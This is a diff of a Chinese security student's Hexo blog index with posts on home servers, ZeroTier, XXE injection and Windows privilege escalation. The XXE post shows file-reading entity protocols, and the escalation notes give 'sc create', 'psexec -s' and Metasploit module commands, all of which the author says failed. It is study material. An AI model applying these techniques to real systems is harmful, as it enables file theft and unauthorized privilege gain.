@@ -52,19 +52,25 @@
       </tags>
   </entry>
   <entry>
+    <title>新年好</title>
+    <url>/post/happy-new-year/</url>
+    <content><![CDATA[<p>欢迎来到1y0ng的blog,今天是2023年的第一天，祝大家新年快乐</p>
+]]></content>
+  </entry>
+  <entry>
     <title>XXE漏洞详解</title>
     <url>/post/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</url>
-    <content><![CDATA[<h1>简介</h1>
+    <content><![CDATA[<h1 id="简介">简介</h1>
 <p>XXE(XML External Entity Injection) <code>XML外部实体注入</code>,之前听这个词听过很多次了,但由于平日里不管是ctf比赛或者是src遇到的都不多,所以一直没有详细的了解过,趁着假期空闲,决定好好学一下这方面的知识。</p>
 <p>XML一般可以用来做数据传输和数据存储,其传输功能和JSON类似,但现在基本使用JSON,很少使用XML,因为XML使用起来太“重”了,而外部实体引入是XML的一个正常功能,但如果在引入时,注入了恶意的外部实体,但本地对注入的外部实体未做严格校验,这时就会出现XXE漏洞。</p>
-<h1>XML基础</h1>
+<h1 id="XML基础">XML基础</h1>
 <p>要明白XXE,我们可以首先从XML基础学起。</p>
 <p>一个XML文档结构包括、<code>XML声明、文档类型定义DTD（可选）、文档元素</code>。</p>
 <p>例如下面这一段就是标准的XML文档</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">user</span> (<span class="keyword">username</span>, <span class="keyword">password</span>)&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">username</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="keyword">password</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p><img src="https://img-blog.csdnimg.cn/4d4d27c0633b434f8243f7d8b50a5ce2.png" alt="在这里插入图片描述"></p>
 <p>通过DTD可以验证XML是否符合正确的语法规则 （DTD实际上类似一段说明文字,说明XML文档的组成元素及结构,如果这里将DTD中的username改为name,打开XML文档并不会报错,只是不符合DTD中定义的语法规则）,DTD可以本地声明,也可以外部引用,而XXE主要就是从DTD入手。</p>
-<h1>DTD实体</h1>
+<h1 id="DTD实体">DTD实体</h1>
 <p>实体是<code>用于定义引用普通文本或特殊字符的快捷方式的变量</code>,可在内部或外部进行声明。</p>
 <p>实体包括<code>一般实体</code>和<code>参数实体</code>,为防止大家被绕晕,这里我们只讲一般实体。</p>
 <p>一般实体声明方式：<code>&lt;!ENTITY 名字 '内容'&gt;</code></p>
@@ -83,7 +89,7 @@
 <p>同时在引用外部实体时,可以使用不同的协议类型来引用 ：</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">file:///path/file.txt</span><br><span class="line">http://url/file.txt</span><br><span class="line">php://filter/read=convert.base64-encode/resource=file.txt</span><br></pre></td></tr></table></figure>
 <p>聪明的你们一定已经发现了,只要将admin.txt换成其他文件,就可以实现文件的任意读取了</p>
-<h1>PHP中的XML</h1>
+<h1 id="PHP中的XML">PHP中的XML</h1>
 <p>php中常见的与XML有关的函数是 <code>simplexml_load_string</code></p>
 <p>其用法为 <code>simplexml_load_file(string,class,options,ns,is_prefix)</code></p>
 <table>
@@ -120,7 +126,7 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="comment">//通过php伪协议直接接收POST传参</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$data</span>, <span class="string">&quot;SimpleXMLElement&quot;</span>, LIBXML_NOENT);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xml</span>-&gt;username;</span><br></pre></td></tr></table></figure>
 <p>利用XXE读取log.txt的内容<br>
 <img src="https://img-blog.csdnimg.cn/4d7a3d360f154acc92b406c30ac7e9e3.png" alt="在这里插入图片描述"></p>
-<h1>防御</h1>
+<h1 id="防御">防御</h1>
 <p>XXE的防御一般通过两种方式<br>
 1.使用开发语言提供的禁用外部实体的方法, 例如php中使用<code>libxml_disable_entity_loader(true)</code><br>
 2.对用户输入的内容进行过滤,过滤掉<code>&lt;!DOCTYPE</code>和<code>&lt;!ENTITY</code>,或者<code>SYSTEM</code>和<code>PUBLIC</code>。</p>
@@ -150,6 +156,97 @@
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>seafile和alist使用体验</title>
+    <url>/post/seafile%E5%92%8Calist%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/</url>
+    <content><![CDATA[<h3 id="背景">背景</h3>
+<p>家里有一台十年前的空闲主机，处理器是赛扬j1900，主板是梅捷SY-1900，平时没怎么使用，正好主板上空着一个sata2接口的硬盘位，就想着废物利用，搭建一个属于自己的<strong>私人网盘</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/b714094e70284d59a3211d8279c39bdb.jpg" alt="b714094e70284d59a3211d8279c39bdb.jpg"  /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h3 id="seafile">seafile</h3>
+<p>一开始只对seafile有了解，所以没有考虑其他的网盘系统就直接开始搭建seafile了，seafile的部署和使用比较简单，在win7上部署可以参考下面这位大佬的文章（要自己去获取seafile-server_5.0.3_win32.tar.gz的资源）</p>
+<p><a href="https://blog.csdn.net/wwwwestcn/article/details/122424469">https://blog.csdn.net/wwwwestcn/article/details/122424469</a></p>
+<p>seafile在windows上的搭建方法比较简单，整个过程没有遇到什么太难的问题，接下来就我自己的体验来谈谈seafile的优缺点</p>
+<p>优点：</p>
+<p>​    1.支持<strong>多平台客户端</strong>访问、连手机都有专业的app</p>
+<p>​    2.对本地储存的数据进行了<strong>加密</strong>、无法在本地进行查看（这一点因人而异，我认为是优点）</p>
+<p>​    3.访问时必须要输入密码，提高了数据的安全性</p>
+<p>缺点：</p>
+<p>​    1.大于30M的数据只能下载<strong>不能在线预览</strong>，想要线上看视频基本上是不可能的了（这是后来换alist的主要原因）</p>
+<p>​    2.windows版本的<strong>服务端</strong>已经停止更新了，只能自己去找老的版本下载</p>
+<p>​    3.配置有些复杂，访问是用的8000端口、上传是用的8082端口，意味着进行端口转发或者配置反代理服务器的时候需要同时对两个端口进行操作</p>
+<p><img src="https://img-blog.csdnimg.cn/17f9bc567d1d42b9b38de90751182d38.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h3 id="alist">alist</h3>
+<p>发现seafile的缺点以后，就一直在找其他支持预览大体积文件的私人网盘系统，最终看到了其他博主搭建的alist网盘，发现对预览视频大小没有限制就开始部署alist了</p>
+<p>alist的部署更加简单，具体可以看这位博主的文章</p>
+<p><a href="https://blog.csdn.net/weixin_43957923/article/details/128045524">Alist搭建_「已注销」的博客-CSDN博客_alist搭建教程</a></p>
+<p>同样讲一下alist的优缺点</p>
+<p>优点：</p>
+<p>​    1.搭建简单、配置也不麻烦、页面简易美观</p>
+<p>​    2.支持大体积文件的在线预览、不用下载也能观看</p>
+<p>缺点：</p>
+<p>​    1.没有客户端工具只能通过网页端访问资源</p>
+<p>​    2.默认内容对所有访问用户开放、隐私的内容和相关密码需要自己配置</p>
+<p>​    3.可以通过图片视图大致预览图片列表、希望视频也能有个封面查看</p>
+<p>​    4.有点“重”，内容多的话要加载很久</p>
+<p>这里alist的缺点很多，主要也是因为用alist的体验比较久，但目前来说我对alist的使用是比较满意的，并且alist还支持和百度网盘、阿里网盘、onedrive等知名网盘的联动</p>
+<h3 id="alist的安全问题">alist的安全问题</h3>
+<p>利用黑暗搜索引擎对含有alist的特征网页进行搜索</p>
+<p><img src="https://img-blog.csdnimg.cn/d8e57c2b9ad746fabebceedd38332d81.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>可以看到搜索结果多达一万多条，说明使用alist的用户群还是比较大的，而alist搭建过程中如果管理员没有进行特殊配置的话，所上传的内容是默认对所有访客用户开放的，也就是说你上传的文件没有经过隐私处理就直接暴露在了公网上的话，所有人都可以看到你的文件，如果此时又挂载了百度网盘等其他云储存服务，那么这些网盘中的内容也同样是对外开放的，而这些网盘一般都有同步手机信息、相册、聊天记录等功能，所以极易造成个人隐私泄漏</p>
+<p><img src="https://img-blog.csdnimg.cn/c811906dc6474fadbf5ef3751dee8221.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>（上图是搜索结果中随意点开的一个网页，可以看到网页挂载了很多的网盘，网盘里的内容所有人可见）</p>
+<p>为了防止这种隐私泄漏，我们需要对隐私文件进行<strong>加密或隐藏</strong>，加密方法在alist的说明文档中有</p>
+<p><a href="https://alist.nn.ci/zh/guide/advanced/meta.html">元信息 | AList文档 (nn.ci)</a></p>
+<p>同时也可以参考下面这位up主的视频</p>
+<p><a href="https://b23.tv/IYeqcm6">【Alist】Alist的四大功能使用教程_哔哩哔哩_bilibili</a></p>
+<h3 id="最后">最后</h3>
+<p>搭建私人网盘一定要注意个人信息不被泄露，最好不要直接暴露在公网上，想要访问的话可以通过内网穿透工具实现。</p>
+]]></content>
+      <categories>
+        <category>使用体验</category>
+      </categories>
+      <tags>
+        <tag>alist</tag>
+        <tag>seafile</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Zerotier的使用体验</title>
+    <url>/post/zerotier/</url>
+    <content><![CDATA[<h1 id="背景">背景</h1>
+<p>我的ipv6服务器是利用春节放假几天搭建起来的，平时是放在家里，而春节结束以后回到了实习租的房子里上班第一天就发现服务器无法访问了，ssh也连不上，但服务器可以出网（因为我的定时任务结束后会给我发消息）</p>
+<p>一开始怀疑是我的ddns脚本出了问题，因为阿里云的解析日志一直没有更新，就想通过<strong>爆破</strong>的方式获得真实的ipv6地址，也失败了（不得不说ipv6空间范围是真的大，开10个线程爆了我2小时，呜呜呜~~~）</p>
+<p><img src="https://image.3001.net/images/20220208/16443286461724.png" alt="img"></p>
+<p>周末回到家（论工作地点离家近的重要性hhh）才发现是ipv6地址被<strong>回收</strong>了，只给我留了个<strong>fe80</strong>开头的内网ipv6地址</p>
+<p><img src="https://img-blog.csdnimg.cn/ed356665c6d9454b8696d70828f6d416.jpeg" alt="img"></p>
+<p>重启路由器的ipv6开关以后又重新得到了ipv6地址（这里不知道是路由器配置的问题还是什么原因，有懂的师傅欢迎在评论区补充）</p>
+<p>为了防止这种情况再次发生，除了ipv6直接访问以外我还得有一种备用措施，在没有ipv6的情况下也能访问内网设备，于是Zerotier成为了我的目标</p>
+<h1 id="Zerotier">Zerotier</h1>
+<p>Zerotier是一款用于构建<strong>异地虚拟局域网</strong>的工具，通过网页后台创建虚拟网络并通过电脑上的Zerotier客户端连接各个异地电脑到虚拟局域网，从而实现组网由后台分配虚拟ip，并且各个异地电脑可以通过虚拟IP对同一虚拟局域网下的其他电脑进行访问</p>
+<p><img src="https://img-blog.csdnimg.cn/43d97752d6ff40539818eefbcb6289e2.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h2 id="安装配置">安装配置</h2>
+<p>Zerotier的安装配置都比较简单，可参照b站上这位up主的视频</p>
+<p><a href="https://www.bilibili.com/video/BV1hK4y1L7ND/?buvid=XU7B1187220CEA5BEB8E1D6547D1ECD2814F4&amp;is_story_h5=false&amp;mid=CZP6291YuQ9EvlArsK6mQw%3D%3D&amp;p=1&amp;plat_id=114&amp;share_from=ugc&amp;share_medium=android&amp;share_plat=android&amp;share_session_id=bb883d71-ff0f-45c4-ac3a-cdd56ff7cf9b&amp;share_source=COPY&amp;share_tag=s_i&amp;timestamp=1676083314&amp;unique_k=arTrXpi&amp;up_id=35973342&amp;vd_source=b2a0cc29ab6a8cf18c26c53dcd232ca4">强大的内网穿透工具ZeroTier，随时随地远程访问家中NAS和其它设备！没有公网IP也不怕_哔哩哔哩_bilibili</a></p>
+<p>同时centos 的安装可以参照这位大佬的文章</p>
+<p><a href="https://blog.csdn.net/COCO56/article/details/123296985#">https://blog.csdn.net/COCO56/article/details/123296985#</a></p>
+<h2 id="体验">体验</h2>
+<p>Zerotier和传统的内网穿透工具不同，并不是通过一个中转服务器来建立连接的，而是使用端到端的<strong>p2p</strong>协议（在连接不稳定的时候也会采用中转服务器的方式建立连接）</p>
+<p><img src="https://img-blog.csdnimg.cn/d14f7e6dbc424d29a8a9137b177fb8a2.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>可以看到延迟并不算很高，这几天用下来个人还是比较满意的</p>
+<p>通过这种方式可以部署一些<strong>只有内网ipv4才可以访问</strong>的服务，例如我就用niginx开了个ipv4的端口，将数据转发到了路由器上，下次ipv6出现问题也就可以直接通过Zerotier访问路由器重启ipv6服务</p>
+<h2 id="安全性">安全性</h2>
+<p>Zerotier作为一款强大的网络存取服务，拥有内置的AES-256加密算法，并提供安全控制，可以控制用户连接的访问，以限制对私有网络的访问，并防止未经授权的访问，所以Zerotier的安全性还是比较高的</p>
+<h1 id="结语">结语</h1>
+<p>总的来说，ZeroTier的使用确实非常容易。它的简单易用性，功能丰富的网络功能和强大的安全特性，使ZeroTier成为最佳的专业网络解决方案，特别是在新兴兼容性和技术能力需求时期。</p>
+<p>（此段结语由ChatGPT生成，嘻嘻~~，总的来说Zerotier还是比较简单好用的，有内网访问需求的伙伴们可以考虑使用）</p>
+]]></content>
+      <categories>
+        <category>使用体验</category>
+      </categories>
+      <tags>
+        <tag>zerotier</tag>
+      </tags>
   </entry>
   <entry>
     <title>利用ipv6搭建一台服务器</title>
@@ -223,73 +320,19 @@
       </tags>
   </entry>
   <entry>
-    <title>seafile和alist使用体验</title>
-    <url>/post/seafile%E5%92%8Calist%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/</url>
-    <content><![CDATA[<h3 id="背景">背景</h3>
-<p>家里有一台十年前的空闲主机，处理器是赛扬j1900，主板是梅捷SY-1900，平时没怎么使用，正好主板上空着一个sata2接口的硬盘位，就想着废物利用，搭建一个属于自己的<strong>私人网盘</strong></p>
-<p><img src="https://img-blog.csdnimg.cn/b714094e70284d59a3211d8279c39bdb.jpg" alt="b714094e70284d59a3211d8279c39bdb.jpg"  /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<h3 id="seafile">seafile</h3>
-<p>一开始只对seafile有了解，所以没有考虑其他的网盘系统就直接开始搭建seafile了，seafile的部署和使用比较简单，在win7上部署可以参考下面这位大佬的文章（要自己去获取seafile-server_5.0.3_win32.tar.gz的资源）</p>
-<p><a href="https://blog.csdn.net/wwwwestcn/article/details/122424469">https://blog.csdn.net/wwwwestcn/article/details/122424469</a></p>
-<p>seafile在windows上的搭建方法比较简单，整个过程没有遇到什么太难的问题，接下来就我自己的体验来谈谈seafile的优缺点</p>
-<p>优点：</p>
-<p>​    1.支持<strong>多平台客户端</strong>访问、连手机都有专业的app</p>
-<p>​    2.对本地储存的数据进行了<strong>加密</strong>、无法在本地进行查看（这一点因人而异，我认为是优点）</p>
-<p>​    3.访问时必须要输入密码，提高了数据的安全性</p>
-<p>缺点：</p>
-<p>​    1.大于30M的数据只能下载<strong>不能在线预览</strong>，想要线上看视频基本上是不可能的了（这是后来换alist的主要原因）</p>
-<p>​    2.windows版本的<strong>服务端</strong>已经停止更新了，只能自己去找老的版本下载</p>
-<p>​    3.配置有些复杂，访问是用的8000端口、上传是用的8082端口，意味着进行端口转发或者配置反代理服务器的时候需要同时对两个端口进行操作</p>
-<p><img src="https://img-blog.csdnimg.cn/17f9bc567d1d42b9b38de90751182d38.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<h3 id="alist">alist</h3>
-<p>发现seafile的缺点以后，就一直在找其他支持预览大体积文件的私人网盘系统，最终看到了其他博主搭建的alist网盘，发现对预览视频大小没有限制就开始部署alist了</p>
-<p>alist的部署更加简单，具体可以看这位博主的文章</p>
-<p><a href="https://blog.csdn.net/weixin_43957923/article/details/128045524">Alist搭建_「已注销」的博客-CSDN博客_alist搭建教程</a></p>
-<p>同样讲一下alist的优缺点</p>
-<p>优点：</p>
-<p>​    1.搭建简单、配置也不麻烦、页面简易美观</p>
-<p>​    2.支持大体积文件的在线预览、不用下载也能观看</p>
-<p>缺点：</p>
-<p>​    1.没有客户端工具只能通过网页端访问资源</p>
-<p>​    2.默认内容对所有访问用户开放、隐私的内容和相关密码需要自己配置</p>
-<p>​    3.可以通过图片视图大致预览图片列表、希望视频也能有个封面查看</p>
-<p>​    4.有点“重”，内容多的话要加载很久</p>
-<p>这里alist的缺点很多，主要也是因为用alist的体验比较久，但目前来说我对alist的使用是比较满意的，并且alist还支持和百度网盘、阿里网盘、onedrive等知名网盘的联动</p>
-<h3 id="alist的安全问题">alist的安全问题</h3>
-<p>利用黑暗搜索引擎对含有alist的特征网页进行搜索</p>
-<p><img src="https://img-blog.csdnimg.cn/d8e57c2b9ad746fabebceedd38332d81.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>可以看到搜索结果多达一万多条，说明使用alist的用户群还是比较大的，而alist搭建过程中如果管理员没有进行特殊配置的话，所上传的内容是默认对所有访客用户开放的，也就是说你上传的文件没有经过隐私处理就直接暴露在了公网上的话，所有人都可以看到你的文件，如果此时又挂载了百度网盘等其他云储存服务，那么这些网盘中的内容也同样是对外开放的，而这些网盘一般都有同步手机信息、相册、聊天记录等功能，所以极易造成个人隐私泄漏</p>
-<p><img src="https://img-blog.csdnimg.cn/c811906dc6474fadbf5ef3751dee8221.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>（上图是搜索结果中随意点开的一个网页，可以看到网页挂载了很多的网盘，网盘里的内容所有人可见）</p>
-<p>为了防止这种隐私泄漏，我们需要对隐私文件进行<strong>加密或隐藏</strong>，加密方法在alist的说明文档中有</p>
-<p><a href="https://alist.nn.ci/zh/guide/advanced/meta.html">元信息 | AList文档 (nn.ci)</a></p>
-<p>同时也可以参考下面这位up主的视频</p>
-<p><a href="https://b23.tv/IYeqcm6">【Alist】Alist的四大功能使用教程_哔哩哔哩_bilibili</a></p>
-<h3 id="最后">最后</h3>
-<p>搭建私人网盘一定要注意个人信息不被泄露，最好不要直接暴露在公网上，想要访问的话可以通过内网穿透工具实现。</p>
-]]></content>
-      <categories>
-        <category>使用体验</category>
-      </categories>
-      <tags>
-        <tag>alist</tag>
-        <tag>seafile</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>后渗透之权限提升（学习记录）</title>
     <url>/post/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%88%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%89/</url>
-    <content><![CDATA[<h1>序</h1>
+    <content><![CDATA[<h1 id="序">序</h1>
 <p>本来兴致勃勃的想要学一下内网横向渗透的，结果发现其他人随随便便用永恒之蓝就直接拿到了system权限，但同样的靶机，自己电脑上的永恒之蓝完全没用，于是干脆复习了一遍window下的权限提升方法。<br>
 （本文主要是针对windows提权方法进行总结，在实验中以win7为例，采用的提权方法均<strong>失败</strong>了，想要看到成功截图的请移步其他大佬的博客）<br>
 靶机是<code>win7</code>的系统，登录的账户为<code>demo\douser</code>，是demo域下的一个普通域成员</p>
-<h1>系统内核溢出漏洞提权</h1>
+<h1 id="系统内核溢出漏洞提权">系统内核溢出漏洞提权</h1>
 <p>使用msf的<code>post/windows/gather/enum_patches</code>模块搜索系统中缺少的补丁<br>
 <img src="4f5f00b6bc3347f0a86236345577d948.png" alt=""><br>
 好家伙，补丁全打上了<br>
 用<code>post/multi/recon/local_exploit_suggester</code>查看可以利用的漏洞模块<br>
 <img src="29f8aed66ddd45d1b57263ce119d4b63.png" alt="">尝试了给出的几种攻击模块，全部失败</p>
-<h1>计划任务</h1>
+<h1 id="计划任务">计划任务</h1>
 <p>windows中用来执行计划任务的无疑是<code>at</code>和<code>schtasks</code>命令，然而从 Windows Vista 开始，Microsoft 已经不再推荐使用“at”命令来创建计划任务，并且在后续的 Windows 版本中将其标记为“弃用”。所以在win7上我们通过schtasks来尝试提升权限<br>
 <img src="15572ce9a95744a6b28854fa6f7c9db4.png" alt=""><br>
 当前用户并没有操作schtasks的权限，虽然at命令被弃用了，但事实上除了win11以外，<strong>其他的从 Windows Vista 到win10都是可以使用at创建计划任务的</strong>，只不过无法使用/interactive交互式任务。<br>
@@ -298,14 +341,14 @@
 所以对于win7我们依旧可以上传木马到目标机器，同时msf开启监听，利用at执行木马，就会返回一个system权限的shell<br>
 但是这里我们依旧没有使用at的权限<br>
 <img src="310523a50df24e6db0f04723766a6e7a.png" alt="在win7上使用at"></p>
-<h1>sc提权</h1>
+<h1 id="sc提权">sc提权</h1>
 <p>之前一直以为sc提权就是schtasks计划任务（主要是schtasks的首字母就是sc），实际上二者没啥关系。</p>
 <p><code>sc 命令</code>是 Windows 操作系统中的一个命令行工具，用于配置和管理 Windows 服务。在一些情况下，可以使用 sc 命令进行提权，例如将一个普通用户权限的服务修改为 LocalSystem 账户权限。</p>
 <p>这种提权的原理是因为在 Windows 系统中，服务通常使用某个特定的账户来运行，如果该账户拥有较高的权限，那么相应的服务也就具备了这些权限。因此，通过使用 sc 命令修改服务所使用的账户，可以实现提升服务权限的目的。</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sc Create systemcmd binPath= &quot;cmd /K start&quot; type= own type= interact</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">其中systemcmd是服务名称，大家可以随意填写，binpath是启动的命令，<span class="built_in">type</span>=own是指服务这个服务属于谁，<span class="built_in">type</span>=interact。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这里再解释一下 cmd/k start 这个命令，这个命令就是启动一个新的cmd窗口。</span></span><br><span class="line"></span><br><span class="line">sc start systemcmd #启动服务！</span><br></pre></td></tr></table></figure>
 <p>然而依旧没有sc的使用权限<br>
 <img src="1da3fa294d7c4883b1cfa606d14eb060.png" alt=""></p>
-<h1>PS提权</h1>
+<h1 id="PS提权">PS提权</h1>
 <p><code>PsExec</code>是 Sysinternals 工具包中的一款命令行实用程序，可以在远程计算机上执行进程，并且可以在一定程度上提升权限。它的提权原理主要是通过以下步骤实现：</p>
 <blockquote>
 <p>1、使用<code>管理员凭据</code>登录到目标计算机。<br>
@@ -316,7 +359,7 @@
 <p>提权命令：<code>psexec.exe -accepteula -s -i -d cmd.exe</code><br>
 我们这里登录的账户并不是管理员，所以寄了<br>
 <img src="e41d4c46fa6245148dea3cea271cdbad.png" alt=""></p>
-<h1>BypassUAC</h1>
+<h1 id="BypassUAC">BypassUAC</h1>
 <p><code>UAC（用户账户控制）</code>是从 Windows Vista 开始引入的一种安全功能，可以限制应用程序和用户对计算机系统的更改，并将管理员权限的请求提示给用户以确认。其工作原理如下：</p>
 <blockquote>
 <p>1、当需要执行某个需要管理员权限的操作时，应用程序或用户会向 UAC 发送请求。<br>
@@ -328,14 +371,14 @@
 <p>在msf中集成了bypassuac模块，但我们提权的时候，当前用户必须在<code>管理员组</code>中，且UAC必须为默认设置（即“<code>仅在程序试图更改我的计算机时通知我</code>”）<br>
 <img src="985d2a3964114cf0983a711a09f33498.png" alt=""><br>
 果然还是失败了</p>
-<h1>令牌窃取</h1>
+<h1 id="令牌窃取">令牌窃取</h1>
 <p><code>令牌窃取（Token Stealing）</code>是一种攻击技术，可以使用操作系统中的特权漏洞或恶意软件等手段来获取其他进程或用户的<code>安全令牌（Security Token）</code>，从而获得对系统资源和权限的访问控制。</p>
 <p>Kerberos 是 Windows 系统中一个常用的身份验证协议，可以帮助用户在不安全的网络环境中建立安全信任关系，并防止密码被破解或监听等威胁。然而，如果系统中存在 Kerberos 相关的漏洞或错误，攻击者可以利用这些漏洞或错误来进行令牌窃取攻击。</p>
 <p>在 Windows 操作系统中，每个登录用户都会拥有一个唯一的安全令牌，该令牌包含了用户的身份信息、权限等，并且可以被用于身份验证、授权、进程通信等场景下的安全标识和传递。与此同时，在 Kerberos 认证过程中，当用户向 Kerberos 服务器发送凭据请求（TGT 请求）后，Kerberos 服务器将返回一个包含用户身份信息和授权信息的 Kerberos 票据。该票据也可以被视为一种安全令牌，并且能够帮助用户在其他服务或应用程序中进行身份验证和访问控制。</p>
 <p>我们在拿到win7的shell以后可以通过<code>use incognito</code>和<code>list_tokens -u</code>来列出可用的令牌<br>
 <img src="75e4950571944ccd8ab2246406ae3f71.png" alt=""><br>
 明显这里只有demo/douser的令牌，所以令牌窃取无效</p>
-<h1>最后</h1>
+<h1 id="最后">最后</h1>
 <p>暂时能想到的提权方法就这么多了，实际上也可以使用Powershell的提权脚本<code>Powerup</code>，但这里win7默认是禁止使用Powershell脚本的，并且当前账户也没有权限对其进行修改，所以GG了<br>
 <img src="6f0e512152a54f92b8baa3e0c96f47a4.png" alt=""></p>
 <p>大佬们有什么方法欢迎评论告知</p>
@@ -350,55 +393,18 @@
       </tags>
   </entry>
   <entry>
-    <title>Zerotier的使用体验</title>
-    <url>/post/zerotier/</url>
-    <content><![CDATA[<h1>背景</h1>
-<p>我的ipv6服务器是利用春节放假几天搭建起来的，平时是放在家里，而春节结束以后回到了实习租的房子里上班第一天就发现服务器无法访问了，ssh也连不上，但服务器可以出网（因为我的定时任务结束后会给我发消息）</p>
-<p>一开始怀疑是我的ddns脚本出了问题，因为阿里云的解析日志一直没有更新，就想通过<strong>爆破</strong>的方式获得真实的ipv6地址，也失败了（不得不说ipv6空间范围是真的大，开10个线程爆了我2小时，呜呜呜~~~）</p>
-<p><img src="https://image.3001.net/images/20220208/16443286461724.png" alt="img"></p>
-<p>周末回到家（论工作地点离家近的重要性hhh）才发现是ipv6地址被<strong>回收</strong>了，只给我留了个<strong>fe80</strong>开头的内网ipv6地址</p>
-<p><img src="https://img-blog.csdnimg.cn/ed356665c6d9454b8696d70828f6d416.jpeg" alt="img"></p>
-<p>重启路由器的ipv6开关以后又重新得到了ipv6地址（这里不知道是路由器配置的问题还是什么原因，有懂的师傅欢迎在评论区补充）</p>
-<p>为了防止这种情况再次发生，除了ipv6直接访问以外我还得有一种备用措施，在没有ipv6的情况下也能访问内网设备，于是Zerotier成为了我的目标</p>
-<h1>Zerotier</h1>
-<p>Zerotier是一款用于构建<strong>异地虚拟局域网</strong>的工具，通过网页后台创建虚拟网络并通过电脑上的Zerotier客户端连接各个异地电脑到虚拟局域网，从而实现组网由后台分配虚拟ip，并且各个异地电脑可以通过虚拟IP对同一虚拟局域网下的其他电脑进行访问</p>
-<p><img src="https://img-blog.csdnimg.cn/43d97752d6ff40539818eefbcb6289e2.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<h2 id="安装配置">安装配置</h2>
-<p>Zerotier的安装配置都比较简单，可参照b站上这位up主的视频</p>
